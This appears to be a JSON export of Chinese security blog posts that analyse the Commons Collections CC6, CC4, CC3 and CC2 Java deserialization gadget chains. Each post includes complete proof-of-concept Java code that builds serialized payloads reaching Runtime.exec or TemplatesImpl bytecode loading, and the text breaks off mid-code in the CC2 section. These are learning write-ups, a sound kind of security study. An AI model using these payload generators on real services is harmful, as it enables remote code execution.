[{"content":"因为电脑的缘故，把java 1.7 和 java 1.8的低版本都放在windows即另一台机器上面，所以，就简单的学习了一下CC5链的一些原理，具体复现之后有时间配置好环境即可，今天就先主要学习复现一下利用版本没那么苛刻的CommonsCollections6。\n简单看了一下CC5的原理，主要是javax.management.BadAttributeValueExpException在反序列化过程中会调用valObj的toString方法，TiedMapEntry#toString会触发本身的getValue从而触发HashMap的get方法，从而触发LazyMap,从而触发RCE链。\n这里su18师傅提出了两条链，一种是继续找到一个能够调用TiedMapEntry#getValue方法即可，在CC5的学习中，TiedMapEntry#hashcode方法也是可以出发getValue方法的，这让我们想到了之前在URLDNS中的学习，对hashMap的put方法的绕过，因此我们通过序列化一个HashMap实例对象，其readObejct方法会产生对hash(key)从而调用getValue方法，实现RCE。\n类似 URLDNS2 的利用反射调用 putVal 方法写入 key 避免触发。 在向 HashMap push LazyMap 时先给个空的 ChainedTransformer，这样添加的时候不会执行任何恶意动作，put 之后再反射将有恶意链的 Transformer 数组写到 ChainedTransformer 中。 第二种就是HashMap 的 put 方法可以触发 key 的 hashCode ，那还有没有入口类能触发这个方法了？于是就有了 CC6 的 HashSet 触发方式。\n前提知识 TiedMapEntry 这里的hashCode和toString方法都可以通过执行getValue方法，从而执行LazyMap里面的攻击链。\nHashSet HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个private static final Object PRESENT = new Object();。HashSet 跟 HashMap 一样，都是一个存放链表的数组。\n在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。\n利用过程 LazyMap\u0026amp;HashMap 攻击链也很清晰,讲一个TiedMapEntry实例封装好一个空的lazyMap，防止将TiedMapEntry实例进入hashMap时也产生攻击行为，然后通过反射，将ChainedTransformer将对应的iTransformers修改为我们构造好的具有的攻击行为lazyMap。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package CC6; import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.util.HashMap; import java.util.Map; /** * @ClassName CC6WithHashMap * @Description TODO * @Author reus09 * @Date 2022/10/29 15:34 * @Version 1.0 **/ public class CC6WithHashMap { public static String fileName = \u0026#34;CC6WithHashMap.bin\u0026#34;; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException { // 初始化 HashMap HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // 创建 ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; // 创建一个空的 ChainedTransformer ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{}); // 创建 LazyMap 并引入 TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); hashMap.put(entry, \u0026#34;reu09\u0026#34;); //用反射再改回真的chain Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(fakeChain, transformers); //清空由于 hashMap.put 对 LazyMap 造成的影响 lazyMap.clear(); SeralizeUtil.writeObjectToFile(hashMap, fileName); SeralizeUtil.readFileObject(fileName); } } 弹窗如下\nHashSet 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package CC6; import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; /** * @ClassName CC6WithHashSet * @Description TODO * @Author reus09 * @Date 2022/10/29 15:40 * @Version 1.0 **/ public class CC6WithHashSet { public static String fileName = \u0026#34;CC6WithHashSet.bin\u0026#34;; public static void main(String[] args) throws Exception { // 初始化 HashMap HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); // 创建 ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; // 创建一个空的 ChainedTransformer ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{}); // 创建 LazyMap 并引入 TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); HashSet set = new HashSet(1); set.add(entry); //用反射再改回真的chain Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(fakeChain, transformers); //清空由于 hashMap.put 对 LazyMap 造成的影响 lazyMap.clear(); SeralizeUtil.writeObjectToFile(set, fileName); SeralizeUtil.readFileObject(fileName); } } 可以看到，HashSet和HashMap的调用原理区别不大，都是通过反序列化过程的put(实际上就是HashMap的putValue)方法，从而触发hashcode，进一步get触发LazyMap。\n总结 以上就是 CC6 链分析的全部内容了，最后总结一下。\n利用说明： HashMap#readObject 调用 HashMap#hash 继而调用 key.hashCode ，也就是 TiedMapEntry 的 hashCode ，继而调用 TiedMapEntry 的 getValue ，最后调用 LazyMap 的 get 方法。 HashSet#readObject 调用 map.put() ,这个 map 就是 HashMap ，然后 HashMap#put 调用 hash(key) ，后面与 HashMap 利用链一样。 Gadget 总结： kick-off gadget：java.util.HashSet#readObject()/java.util.HashMap#readObject() sink gadget：org.apache.commons.collections.functors.InvokerTransformer#transform() chain gadget：org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode() 调用链展示： 1 2 3 4 5 6 7 HashSet.readObject()/HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() 依赖版本\ncommons-collections : 3.1～3.2.1\n","permalink":"http://www.reus09.top/posts/tech/commonscollections6%E5%88%86%E6%9E%90/","summary":"因为电脑的缘故，把java 1.7 和 java 1.8的低版本都放在windows即另一台机器上面，所以，就简单的学习了一下CC5链的一些原理，具体复现之后","title":"CommonsCollections6分析"},{"content":"这几天一直在忙一个项目的打杂，今天也是抽时间继续学习了CommonCollections链的第四条链。\n这里还是跟着su18师傅学习commonCollections4,CC4 是 CC2 的一个变种，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用InstantiateTransformer实例化 TemplatesImpl，排列组合了属于是。之前CC2根据su18师傅的介绍，使用的ChainedTransformer一种方式为：直接为InvokeTransformer。\n在学习ysoserial 对cc4分析的同时，这里也学习一下PriortyQueue的替代链TreeBag。\n前提知识 按照惯例，我们需要认识一下TreeBag以及其用到的TreeMap的一些基础知识和CC4链的触发原理。\nTreeMap \u0026amp; TreeBag 我们在CC2中学到，QueuePriorty是通过赋予一个TransformingComparator，然后通过排序调用其compare方法，因为comparator也是通过一个transformer来实例化，从而传入了我们构造好的ChainTransformer。\n那么我们能否找到另一个可以在反序列化过程中调用比较器的特殊collections呢？这里就是TreeBag。\n这里就简单介绍一下：\nBag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。\nTreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定Comparator来进行排序。\nTreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化TreeBag时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在TreeMap中。\n在对 TreeBag 反序列化时，会将反序列化出来的 Comparator 对象交给 TreeMap 实例化，并调用父类的 doReadObject 方法处理：传入的参数即为TreeMap类型\n而 doReadObject 方法会向 TreeMap 中 put 数据。\n类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而 TreeBag 则是依赖了 TreeMap 在 put 数据时会调用 compare 进行排序的特点来实现数据顺序的保存。\njava.util.TreeMap#put:\n毫无疑问，compare 方法中调用了 comparator 进行比较，那我们就可以使用 TransformingComparator 触发后续的逻辑。\n攻击构造 ysoserial链 其实就是前面CC2的排列组合加上CC3学到的InstantiateTransformer对传入的Template.class进行实例化，其参数为我们传入的templatesImpl，通过其调用newTransformer来实现RCE攻击。\n代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package CC4; import Util.SeralizeUtil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; /** * @ClassName CC4 * @Description TODO * @Author reus09 * @Date 2022/10/28 19:59 * @Version 1.0 **/ public class CC4 { public static String fileName = \u0026#34;CC4.bin\u0026#34;; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { // 读取恶意类 bytes[] InputStream inputStream = CC4.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // 初始化 TemplatesImpl 对象 TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name 不能为空 Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // 设计 ChainedTransformer ，将tmpl作为参数，传入我们实例化的对象Templates.class里面 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); // 将构造好的恶意chain 通过comparator 进行装饰 TransformingComparator comparator = new TransformingComparator(chain); // 在初始化时不带入 comparator， 防止，在加入元素的时候就产生攻击。 PriorityQueue\u0026lt;String\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;reus\u0026#34;); queue.add(\u0026#34;9\u0026#34;); // 反射设置 PriorityQueue的comparator元素 Field field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field.setAccessible(true); field.set(queue, comparator); SeralizeUtil.writeObjectToFile(queue, fileName); SeralizeUtil.readFileObject(fileName); } } 攻击效果：\nTreeBag 本来我的理解是，TreeBag和PriorityQueue这两个利用的方式没什么区别。\n1 2 3 4 5 6 7 8 9 10 11 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); TransformingComparator comparator = new TransformingComparator(chain); // prepare CommonsCollections object entry point TreeBag tree = new TreeBag(comparator); tree.add(tmpl); 但是，这里发现并不能实现弹窗，经过debug发现，在org.apache.commons.collections4.functors.InstantiateTransformer#transform方法会报错，InstantiateTransformer: Constructor threw an exception。\n原因就是TreeBag本身并没有定义好的Comparator，用到的comparator是由TreeMap实例化的。\n通过这里就发现，实际上就是我们的思路错误了，这里的compare方法比较的TemplatesImpl在我们的chainTransformer装饰过程是无法正常运行，会报错的。\n因此就产生了su18师傅提到的方法，Comparator通过InvokeTransformer来修饰,我们只要控制传入的Object是Templates类，即可直接调用他的newTrasnformer()方法，因此有以下攻击代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package CC4; import Util.SeralizeUtil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.xml.transform.Templates; import java.io.InputStream; import java.lang.reflect.Field; /** * @ClassName CC4WithTreeBag * @Description TODO * @Author reus09 * @Date 2022/10/28 20:03 * @Version 1.0 **/ public class CC4WithTreeBag { public static String fileName = \u0026#34;CC4WithTreeBag.bin\u0026#34;; public static void main(String[] args) throws Exception { // 读取恶意类 bytes[] InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // 初始化 TemplatesImpl 对象 TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name 不能为空 Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法 // 这个类是 public 的，方便调用 Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, new Class[]{}, new Object[]{}); TransformingComparator comparator = new TransformingComparator(transformer); // prepare CommonsCollections object entry point TreeBag tree = new TreeBag(comparator); tree.add(tmpl); // 反射 将`InvokeTransformer` 中的方法 修改为 `newTransformer` Field field = InvokerTransformer.class.getDeclaredField(\u0026#34;iMethodName\u0026#34;); field.setAccessible(true); field.set(transformer, \u0026#34;newTransformer\u0026#34;); SeralizeUtil.writeObjectToFile(tree, fileName); SeralizeUtil.readFileObject(fileName); } } 实现弹窗\n并且调试发现，也能够验证我们先前的判断，其实这也是对前面的cc链理解不到位的原因。\n总结 以上就是 CC4 链分析的全部内容了，最后总结一下。\nysoserial CC4：\n利用说明： 使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码。 Gadget 总结： kick-off gadget：java.util.PriorityQueue#readObject() sink gadget：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadget：org.apache.commons.collections.functors.InstantiateTransformer#transform() 调用链展示： 1 2 3 4 5 6 PriorityQueue.readObject() TransformingComparator.compare() *ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() TreeBag 总结：\n利用说明： 用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。 Gadget 总结： kick-off gadget：org.apache.commons.collections4.bag.TreeBag#readObject sink gadget：org.apache.commons.collections.functors.InvokerTransformer#transform() chain gadget：java.util.TreeMap#put() 调用链展示： 1 2 3 4 5 6 org.apache.commons.collections4.bag.TreeBag.readObject() org.apache.commons.collections4.bag.AbstractMapBag.doReadObject() java.util.TreeMap.put() java.util.TreeMap.compare() org.apache.commons.collections4.comparators.TransformingComparator.compare() org.apache.commons.collections4.functors.InvokerTransformer.transform() 依赖版本\ncommons-collections4 : 4.0\n","permalink":"http://www.reus09.top/posts/tech/commonscollections4%E5%88%86%E6%9E%90/","summary":"这几天一直在忙一个项目的打杂，今天也是抽时间继续学习了CommonCollections链的第四条链。 这里还是跟着su18师傅学习commo","title":"CommonsCollections4分析"},{"content":"因有事耽搁了一天，今天继续CommonsCollection3链的学习。\nCC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。\n在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。\n在 CC2 中，使用TemplatesImpl的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。\n而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发newTransformer的实现方式，同时，CC3没有使⽤到InvokerTransformer，因为在SerialKiller这个Java反序列化过滤器中，将InvokerTransformer加入了黑名单，CC3就是为了绕过这一限制。\n前置知识 TrAXFilter 在 SAX API 中提供了一个过滤器接口 org.xml.sax.XMLFilter，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性，\nTrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。\nInstantiateTransformer 有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。\nCommons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 transform() 方法实际上接收一个 Class 类型的对象，通过 getConstructor 获取构造方法，并通过 newInstance 创建类实例。\n同时，我们也看一下InstantiateTransformer是如何实现初始化的。\n需要传入构造器的参数类型iParamTypes，然后传入构造器的参数iArgs。\n攻击构造 结合一下Gadget,我们可以总结以下思路。\n通过代理readObject触发它的invoke，调用LazyMap的get，再调用chainedTransformer，实现通过InstantiateTransformer对TrAXFilter进行实例化，实例化的参数类型是Templates.class，参数是templatesImpl。TrAXFilter实例化时调用newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了\nPOC部分和CC1差不多了，使用LazyMap对hashMap进行包装；实例化AnnotationInvocationHandler，并对其进行代理；通过实例化参数为代理的InvocationHandler，对代理进行包装。 最后序列化。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class CC3 { public static String fileName = \u0026#34;CC3.bin\u0026#34;; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException { // 读取恶意类 bytes[] InputStream inputStream = CC3.class.getResourceAsStream(\u0026#34;EvilClassForCC3.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // 初始化 TemplatesImpl 对象 TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name 不能为空 Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // 结合 ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); // 初始化 LazyMap Map lazyMap = LazyMap.decorate(new HashMap(), chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); // 创建LazyMap的动态代理类实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); // 使用动态代理初始化 AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy); SerializeUtil.writeObjectToFile(invocationHandler, fileName); //\tSerializeUtil.readFileObject(fileName); } } 攻击结果：\n总结 以上就是 CC3 链分析的全部内容了，最后总结一下。\n利用说明： 利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get/set 等操作，配合 LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞。 Gadget 总结： kick-off gadget：sun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadget：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadget：org.apache.commons.collections.functors.InstantiateTransformer#transform() 调用链展示： 1 2 3 4 5 6 7 8 AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() 依赖版本\ncommons-collections : 3.1～3.2.1 jdk \u0026lt; 7u21\n","permalink":"http://www.reus09.top/posts/tech/commonscollections3%E5%88%86%E6%9E%90/","summary":"因有事耽搁了一天，今天继续CommonsCollection3链的学习。 CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并","title":"CommonsCollections3分析"},{"content":"学习完CommonCollections1链之后，很自然的学习了CommonCollection2，但是CC2链的依赖版本较为固定，为commcons-collections4 4.0。\n在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：\ncommons-collections:commons-collections org.apache.commons:commons-collections4 可⻅，groupId和artifactId都变了。官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中。 其中LazyMap被改名为lazyMap，所以3.2.1中存在反序列化利⽤链修改一下还是可以用在4.0版本中的。\n前置知识 老规矩，在学习CC2链之前，先学习一下Gadget中会用到的一些基础知识。\nPriorityQueue PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。\n因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个Comparator对象来判断两个元素的顺序。\nPriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 queue 中之后，会调用 heapify() 方法来对数据进行排序。\nheapify方法调用siftDown方法，在comparator属性不为空的情况下，调用siftDownUsingComparator方法，\n在siftDownUsingComparator方法中，会调用comparatord的compare()方法进行优先级的比较和排序。\n这样反序列化之后的优先级队列，也拥有了顺序。\nTransformingComparator TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。\nTransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。\nTransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 ComparableComparator.\u0026lt;Comparable\u0026gt;comparableComparator()。\n然后分析该Comparator的compare方法实现了，可以看到调用了 this.transformer.transform() 方法对要比较的两个值进行转换，然后再调用 compare 方法比较，在内部调用其传入的transformer的transform方法，实现了与CC1链的联系。\nTemplatesImpl 关于 TemplatesImpl 的反序列化触发方式，在我之前的 fastjson1.2.24 TemplatesImpl链的文章中有描述，这里不再占用篇幅，简单总结一下就是：\nTemplatesImpl 的属性 _bytecodes 存储了类字节码 TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet 在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码 攻击构造 攻击流程很简单，就是通过PriorityQueue来加入一个TransformingComparator，这个TransformingComparator传入了我们实现构造好的恶意ChainTransformer链。\n恶意代码如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package CC2; import Util.SeralizeUtil; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.IOException; import java.lang.reflect.Field; import java.util.PriorityQueue; /** * @ClassName CC2WithChain * @Description TODO * @Author reus09 * @Date 2022/10/25 18:32 * @Version 1.0 **/ public class CC2WithChain { public static String fileName = \u0026#34;CC2WithChain.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException, IOException { // 初始化 Transformer ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) ); TransformingComparator comparator = new TransformingComparator(chain); // 在初始化时不带入 comparator，而是 PriorityQueue\u0026lt;String\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;2\u0026#34;); Field field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field.setAccessible(true); field.set(queue, comparator); SeralizeUtil.writeObjectToFile(queue, fileName); SeralizeUtil.readFileObject(fileName); } } 这里需要注意的是，在初始化PriorityQueue时没有指定 comparator，而是使用反射写入，这是为了避免在向 queue 中添加内容时触发排序而导致触发恶意 payload。\n弹计算器:\nysoserial的CC2链 ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。\n触发逻辑为：\n创建恶意的 TemplatesImpl 对象，写入 _bytecodes、_name 属性，完成调用newTransformer方法触发恶意类的实例化的条件。 创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。 使用InvokerTransformer（调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。 总结一下就是，在PriorityQueue中放入一个templatesImpl对象(已经在里面注入恶意代码类),然后声明一个TransformingComparator，里面初始化的Transfoermer为InvokeTransformer,InvokeTransformer里面执行的方法为templatesImpl对象的newTransformer()方法，在newTransformer方法里面实现恶意类的实例化。\n最终代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class CC2WithTemplatesImpl { public static String fileName = \u0026#34;CC2WithTemplatesImpl.bin\u0026#34;; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { // 读取恶意类 bytes[] InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // 初始化 PriorityQueue PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;2\u0026#34;); // 初始化 TemplatesImpl 对象 TemplatesImpl tmpl = new TemplatesImpl(); 